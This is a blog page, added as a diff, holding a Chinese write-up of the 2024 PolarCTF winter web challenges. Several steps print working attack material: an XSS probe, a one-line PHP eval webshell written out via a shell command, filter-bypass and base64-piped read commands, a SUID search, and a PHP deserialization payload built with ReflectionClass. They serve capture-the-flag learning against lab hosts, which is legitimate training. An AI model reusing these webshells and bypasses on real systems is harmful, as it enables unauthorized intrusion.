@@ -1,0 +1,362 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>2024polar-winter | DDL'S BLOG</title><meta name="author" content="DDL"><meta name="copyright" content="DDL"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="2024polarctf-web冬季个人挑战赛【WEB】xxmmll这个是先bp发个包，响应的有个php文件，进去之后有个输入框 1  【WEB】赌王 –没做出来直接发空爆破 你可以去ed3d2c21991e3bef5e069713af9fa6ca这个目录下看看,但是这个提示不对，这是个php文件  进入之后会提示,输入数字会在你原有的数字后边+1；长度限制为20  存在xss漏洞但是没东西 数字">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2024polar-winter">
+<meta property="og:url" content="http://example.com/2024/12/08/2024polar-winter/index.html">
+<meta property="og:site_name" content="DDL&#39;S BLOG">
+<meta property="og:description" content="2024polarctf-web冬季个人挑战赛【WEB】xxmmll这个是先bp发个包，响应的有个php文件，进去之后有个输入框 1  【WEB】赌王 –没做出来直接发空爆破 你可以去ed3d2c21991e3bef5e069713af9fa6ca这个目录下看看,但是这个提示不对，这是个php文件  进入之后会提示,输入数字会在你原有的数字后边+1；长度限制为20  存在xss漏洞但是没东西 数字">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/img/avatar.png">
+<meta property="article:published_time" content="2024-12-08T08:44:39.000Z">
+<meta property="article:modified_time" content="2024-12-08T08:50:31.296Z">
+<meta property="article:author" content="DDL">
+<meta property="article:tag" content="5wp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/avatar.png"><link rel="shortcut icon" href="/img/avatar.png"><link rel="canonical" href="http://example.com/2024/12/08/2024polar-winter/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '2024polar-winter',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  isShuoshuo: false
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">7</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> blog</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> categories</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> tags</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> crchives</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> link</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> message</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> about</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">DDL'S BLOG</span></a><a class="nav-page-title" href="/"><span class="site-name">2024polar-winter</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> blog</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> categories</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> tags</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> crchives</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> link</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> message</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> about</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">2024polar-winter</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-12-08T08:44:39.000Z" title="Created 2024-12-08 16:44:39">2024-12-08</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-12-08T08:50:31.296Z" title="Updated 2024-12-08 16:50:31">2024-12-08</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">1.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading Time:</span><span>6mins</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="2024polarctf-web冬季个人挑战赛"><a href="#2024polarctf-web冬季个人挑战赛" class="headerlink" title="2024polarctf-web冬季个人挑战赛"></a>2024polarctf-web冬季个人挑战赛</h1><h2 id="【WEB】xxmmll"><a href="#【WEB】xxmmll" class="headerlink" title="【WEB】xxmmll"></a>【WEB】xxmmll</h2><p>这个是先bp发个包，响应的有个php文件，进去之后有个输入框</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="【WEB】赌王-–没做出来"><a href="#【WEB】赌王-–没做出来" class="headerlink" title="【WEB】赌王 –没做出来"></a>【WEB】赌王 –没做出来</h2><p>直接发空爆破</p>
+<p>你可以去ed3d2c21991e3bef5e069713af9fa6ca这个目录下看看,但是这个提示不对，这是个php文件</p>
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241207111552498.png?raw=ture" alt="image-20241207111552498"></p>
+<p>进入之后会提示,输入数字会在你原有的数字后边+1；长度限制为20</p>
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241207133140668.png?raw=ture" alt="image-20241207133140668"></p>
+<p>存在xss漏洞但是没东西</p>
+<p>数字unicode绕过+科学计数法+全字符绕过   不好使，好像是没被解析</p>
+<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;confirm(1);&lt;/script&gt;</span><br><span class="line">按提示去xss;提示如下↓</span><br><span class="line">就c你o还n想f弹i窗r,m</span><br></pre></td></tr></table></figure>
+
+<p>给出另一个文件php,然后网页源代码有提示，伪造本地IP；然后去命令执行</p>
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241208160223077.png?raw=true" alt="image-20241208160223077"></p>
+<h2 id="【WEB】狗黑子的RCE"><a href="#【WEB】狗黑子的RCE" class="headerlink" title="【WEB】狗黑子的RCE"></a>【WEB】狗黑子的RCE</h2><p>ps看进程，里面没事，env看环境变量，有个假flag</p>
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241207133019257.png?raw=true" alt="image-20241207133019257"></p>
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241207134403900.png?raw=true" alt="image-20241207134403900"></p>
+<h5 id="打开文件使用函数替换"><a href="#打开文件使用函数替换" class="headerlink" title="打开文件使用函数替换"></a>打开文件使用函数替换</h5><ul>
+<li>rev</li>
+<li>strings</li>
+</ul>
+<h5 id="查看目录文件使用函数替换"><a href="#查看目录文件使用函数替换" class="headerlink" title="查看目录文件使用函数替换"></a>查看目录文件使用函数替换</h5><ul>
+<li>find &#x2F;       **<code>find</code>**列出目录及其子目录中的文件。<ul>
+<li>出flag.php</li>
+</ul>
+</li>
+<li>du &#x2F;                 **<code>du</code>**：查看目录大小和文件信息  <ul>
+<li>在这里不出flag.php</li>
+</ul>
+</li>
+<li>stat &#x2F;<ul>
+<li>**<code>stat</code>**：通过 <code>stat</code> 获取文件或目录的详细信息。</li>
+</ul>
+</li>
+</ul>
+<p>最后使用\反下划线绕过flag的禁用</p>
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241207141907968.png?raw=true" alt="image-20241207141907968"></p>
+<h2 id="【WEB】坏掉的上传页"><a href="#【WEB】坏掉的上传页" class="headerlink" title="【WEB】坏掉的上传页"></a>【WEB】坏掉的上传页</h2><p>坏掉的上传页，就写个新的上传页面（让gpt写的）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;POST数据包POC&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;http://c9dea8b9-ab95-4cac-8f5d-0b8744a668a5.www.polarctf.com:8090&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;!--链接是当前打开的题目链接--&gt;</span><br><span class="line">    &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>能传，但是找不到传哪去了</p>
+<p>disearch扫一下发现有个config.php</p>
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241207143740616.png?raw=true" alt="image-20241207143740616"></p>
+<p>内容为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">define(&quot;DB_FILE&quot;, UPLOAD_PATH . &quot;database.db&quot;); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>分析一下👇<code>define(&quot;DB_FILE&quot;, UPLOAD_PATH . &quot;database.db&quot;);</code></p>
+<ul>
+<li><p><strong>作用</strong>：定义常量 <code>DB_FILE</code>，它表示数据库文件的路径。</p>
+</li>
+<li><p><code>define()</code> 用来定义一个常量，这个常量一旦定义就不能再修改。</p>
+</li>
+<li><p>这段代码将常量 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DB_FILE</span><br></pre></td></tr></table></figure>
+
+<p> 设置为一个路径，路径是由 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPLOAD_PATH</span><br></pre></td></tr></table></figure>
+
+<p> 常量和文件名 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">database.db</span><br></pre></td></tr></table></figure>
+
+<p> 拼接而成。</p>
+<ul>
+<li><code>UPLOAD_PATH</code> 是另一个常量或变量，它应该在其他地方定义，并代表上传文件目录的路径。</li>
+<li>例如，如果 <code>UPLOAD_PATH</code> 被定义为 <code>/var/www/uploads/</code>，那么 <code>DB_FILE</code> 就会是 <code>/var/www/uploads/database.db</code>。</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241207144914943.png?raw=true" alt="image-20241207144914943"></p>
+<p>所以步骤就出来了</p>
+<ol>
+<li><p>上传一句话木马<img src="https://github.com/DDL08/images/blob/img/img/image-20241207145612426.png?raw=true" alt="image-20241207145612426"></p>
+</li>
+<li><p>在&#x2F;database.db上边看新出来的文件上传到哪了</p>
+</li>
+<li><p>直接访问利用<img src="https://github.com/DDL08/images/blob/img/img/image-20241207145742361.png?raw=true" alt="image-20241207145742361"></p>
+</li>
+<li><p>这个flag好像是假的；蚁剑连上去全局查找一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -type f -name &quot;*flag*&quot;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>出真flag<img src="https://github.com/DDL08/images/blob/img/img/image-20241207151549176.png?raw=true" alt="image-20241207151549176"></p>
+</li>
+</ol>
+<h2 id="【WEB】button"><a href="#【WEB】button" class="headerlink" title="【WEB】button"></a>【WEB】button</h2><p>查看网页源代码，就是发送了一个请求；直接发包</p>
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241207173603625.png?raw=true" alt="image-20241207173603625"></p>
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241207173435280.png?raw=true" alt="image-20241207173435280"></p>
+<h2 id="【WEB】井字棋"><a href="#【WEB】井字棋" class="headerlink" title="【WEB】井字棋"></a>【WEB】井字棋</h2><p>根据网页源代码制作请求包</p>
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241207180204274.png?raw=true" alt="image-20241207180204274"></p>
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241207180306030.png?raw=true" alt="image-20241207180306030"></p>
+<h2 id="【WEB】简单的导航站"><a href="#【WEB】简单的导航站" class="headerlink" title="【WEB】简单的导航站"></a>【WEB】简单的导航站</h2><p>有提示，鼠标放在5个选项上显示的是，不敲了，自己看吧</p>
+<p>先注册登录，然后有个用户列表，在fastcoll上边构造两个md5之后相等的不相等文件；用yakit发本地文件；可以看到用户列表里面有个<strong>P0la2adm1n</strong></p>
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241207181516647.png?raw=true" alt="image-20241207181516647"></p>
+<p>主页查看页面源代码，出现Admin1234! 这个是密码；账户名爆破上边的这个</p>
+<p>然后上传个gif89a开头的码，然后将码复制出来爆破验证flag哪个，筛选出正确的</p>
+<h2 id="【WEB】坦诚相见"><a href="#【WEB】坦诚相见" class="headerlink" title="【WEB】坦诚相见"></a>【WEB】坦诚相见</h2><p>ls ${PWD:0:1}f\lag</p>
+<p>但是无法打开文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-r--------    1 root     root            39 Dec  6 16:34 /flag</span><br></pre></td></tr></table></figure>
+
+<p>可见需要提权</p>
+<p>再试试看看其他的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find $&#123;PWD:0:1&#125; -type f -name &quot;*fla*&quot;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">/proc/sys/kernel/acpi_video_flags</span><br><span class="line">/proc/sys/kernel/sched_domain/cpu0/domain0/flags</span><br><span class="line">/proc/sys/kernel/sched_domain/cpu0/domain1/flags</span><br><span class="line">/proc/sys/kernel/sched_domain/cpu1/domain0/flags</span><br><span class="line">/proc/sys/kernel/sched_domain/cpu1/domain1/flags</span><br><span class="line">/proc/sys/kernel/sched_domain/cpu2/domain0/flags</span><br><span class="line">/proc/sys/kernel/sched_domain/cpu2/domain1/flags</span><br><span class="line">/proc/sys/kernel/sched_domain/cpu3/domain0/flags</span><br><span class="line">/proc/sys/kernel/sched_domain/cpu3/domain1/flags</span><br><span class="line">/proc/sys/kernel/sched_domain/cpu4/domain0/flags</span><br><span class="line">/proc/sys/kernel/sched_domain/cpu4/domain1/flags</span><br><span class="line">/proc/sys/kernel/sched_domain/cpu5/domain0/flags</span><br><span class="line">/proc/sys/kernel/sched_domain/cpu5/domain1/flags</span><br><span class="line">/proc/sys/kernel/sched_domain/cpu6/domain0/flags</span><br><span class="line">/proc/sys/kernel/sched_domain/cpu6/domain1/flags</span><br><span class="line">/proc/sys/kernel/sched_domain/cpu7/domain0/flags</span><br><span class="line">/proc/sys/kernel/sched_domain/cpu7/domain1/flags</span><br><span class="line">/proc/kpageflags</span><br><span class="line">/sys/devices/pnp0/00:04/tty/ttyS0/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS2/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS3/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS1/flags</span><br><span class="line">/sys/devices/virtual/net/lo/flags</span><br><span class="line">/sys/devices/virtual/net/eth0/flags</span><br><span class="line">/sys/module/scsi_mod/parameters/default_dev_flags</span><br><span class="line">/usr/lib/apache2/mod_deflate.so</span><br><span class="line">/flag</span><br></pre></td></tr></table></figure>
+
+<p>没办法，写码</p>
+<ul>
+<li>法一，自己手搓</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;$(head -c 1 index.php)?php eval(\$_POST[1]); ?$(tail -c 1 index.php)&quot; | tee 2.php</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>法二，模样大佬的码</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Echo &quot;shell&quot; | tee 1.php</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>法三,直接删除no.php</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>法四</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wc $(echo &quot;L2Yq&quot; | base64 -d)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>法五</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd ..;cd ..;cd ..;sudo cat flag</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>法六</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;c3VkbyBjYXQgL22sYc=&#x27;|base64 -d|sh</span><br></pre></td></tr></table></figure>
+
+<p>找suid</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p>suid提权失败，随便点了几下直接出flag了</p>
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241207205535713.png?raw=true" alt="image-20241207205535713"></p>
+<h2 id="【WEB】Note"><a href="#【WEB】Note" class="headerlink" title="【WEB】Note"></a>【WEB】Note</h2><p>disearch扫出文件泄露flag.txt</p>
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241207194901109.png?raw=true" alt="image-20241207194901109"></p>
+<h3 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h3><p>这个根据debug.txt去构造反序列化对象</p>
+<p>参数名为data，对象是Note;里面有个filename和</p>
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241208152739448.png?raw=true" alt="image-20241208152739448"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class Note&#123;</span><br><span class="line">    private $filename;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=new Note();</span><br><span class="line">$reflection =new ReflectionClass($a);</span><br><span class="line"></span><br><span class="line">//修改私有属性</span><br><span class="line">$b =$reflection-&gt;getProperty(&#x27;filename&#x27;);</span><br><span class="line">$b-&gt;setAccessible(true);</span><br><span class="line">$b -&gt;setValue($a,&#x27;flag.txt&#x27;);</span><br><span class="line"></span><br><span class="line">echo serialize($a);</span><br><span class="line">echo urlencode(serialize($a));</span><br></pre></td></tr></table></figure>
+
+<h2 id="任务cmd"><a href="#任务cmd" class="headerlink" title="任务cmd"></a>任务cmd</h2><h3 id="复现-2"><a href="#复现-2" class="headerlink" title="复现"></a>复现</h3><p>响应包有提示</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Powered-By: the username is :  xiaoming</span><br></pre></td></tr></table></figure>
+
+<p>爆破密码</p>
+<p>123123 在url上面修改成xiaohei</p>
+<p>用小黑的电话号作为密钥，在扫目录中idnex.php爆破admin的密码，然后计划一，以cmd为参数命令执行</p>
+<h2 id="ezezser"><a href="#ezezser" class="headerlink" title="ezezser"></a>ezezser</h2><h3 id="复现-3"><a href="#复现-3" class="headerlink" title="复现"></a>复现</h3><p>考的反序列化和git源码泄露</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 GitHack.py http://e1b023a7-f6ad-4077-940e-374e4b38ce61.www.polarctf.com:8090/.git/</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git log --all 用于查看 Git 仓库中所有分支的提交历史记录。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard &lt;commit&gt;：将当前分支重置到指定的提交 &lt;commit&gt;，并且丢弃所有本地更改。</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241208163532029.png?raw=true" alt="image-20241208163532029"></p>
+<p>然后接着做就行，出完整源码了</p>
+<h2 id="ezUtil-java的欠着"><a href="#ezUtil-java的欠着" class="headerlink" title="ezUtil-java的欠着"></a>ezUtil-java的欠着</h2></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://example.com">DDL</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://example.com/2024/12/08/2024polar-winter/">http://example.com/2024/12/08/2024polar-winter/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/5wp/">5wp</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2024/12/03/wucup/" title="2024WuCup-wp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div 